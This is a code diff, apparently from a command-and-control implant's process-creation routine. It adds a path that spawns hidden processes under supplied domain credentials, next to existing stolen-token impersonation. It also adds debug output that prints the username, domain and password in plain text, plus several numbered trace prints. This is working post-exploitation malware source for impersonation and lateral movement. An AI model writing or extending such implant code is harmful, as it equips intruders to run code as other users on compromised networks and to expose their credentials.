@@ -302,6 +302,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         StartUpInfo.hStdOutput = AnonPipe->StdOutWrite;
         StartUpInfo.hStdInput  = NULL;
     }
+
     if ( DataAnonPipes )
     {
         PUTS( "Using specified anon pipes" )
@@ -337,6 +338,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
 
         if ( Instance->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
+            PUTS( "CreateProcessWithTokenW" )
             if ( ! Instance->Win32.CreateProcessWithTokenW(
                     Instance->Tokens.Token->Handle,
                     LOGON_NETCREDENTIALS_ONLY,
@@ -356,9 +358,35 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                 goto Cleanup;
             }
         }
+        else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
+        {
+            PUTS( "CreateProcessWithLogonW" )
+            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance->Tokens.Token->lpUser, Instance->Tokens.Token->lpDomain, Instance->Tokens.Token->lpPassword )
+            if ( ! Instance->Win32.CreateProcessWithLogonW(
+                        Instance->Tokens.Token->lpUser,
+                        Instance->Tokens.Token->lpDomain,
+                        Instance->Tokens.Token->lpPassword,
+                        LOGON_NETCREDENTIALS_ONLY,
+                        App,
+                        CommandLineW,
+                        Flags | CREATE_NO_WINDOW,
+                        NULL,
+                        NULL,
+                        &StartUpInfo,
+                        ProcessInfo
+                    )
+                )
+            {
+                PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                Return = FALSE;
+                goto Cleanup;
+            }
+        }
 
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
         Instance->Win32.LocalFree( CommandLineW );
+        CommandLineW = NULL;
     }
     else
     {
@@ -445,13 +473,18 @@ Cleanup:
     PUTS( "Process cleanup" )
     if ( CommandLineW )
     {
+        PUTS( "1" )
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
         Instance->Win32.LocalFree( CommandLineW );
     }
 
+    PUTS( "2" )
     PackageDestroy( Package );
+
+    PUTS( "3" )
     AnonPipesClose( &AnonPipe );
 
+    PUTS( "4" )
     return Return;
 }
 
